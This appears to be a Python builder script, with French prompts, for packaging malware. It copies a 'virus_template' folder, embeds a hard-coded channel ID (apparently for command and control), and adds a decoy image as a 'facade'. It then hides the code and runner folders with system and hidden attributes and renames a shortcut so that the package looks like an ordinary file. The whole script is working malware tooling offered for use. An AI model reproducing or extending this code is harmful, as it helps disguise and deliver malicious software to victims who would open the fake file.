import os
channels={
    "1": "1287857686230339654",
    "2": "1287857722657738905",
    "3": "1287857752756195400"
}
input("svp renomez votre fichier de facade en 'jsp.png'")
name=input("nom du racourcis: ")
ch_id_=input("channel: ")
ch_id=channels[ch_id_]
os.system("robocopy virus_template folder /s")
os.system("echo "+ch_id+">./folder/code/microsoft_windows_10/channel.txt")
os.system('copy jsp.png "./folder/runner/jsp.png"')
os.system("attrib +h +s ./folder/code")
os.system("attrib +h +s ./folder/runner")
#os.system("attrib +h ./folder/code")
#os.system("attrib +h ./folder/runner")
print("ren ./folder/name.lnk "+name+".lnk")
os.system("cd folder & ren name.lnk "+name+".lnk")
os.system("cd ..")
input("tout c'est bien passé")
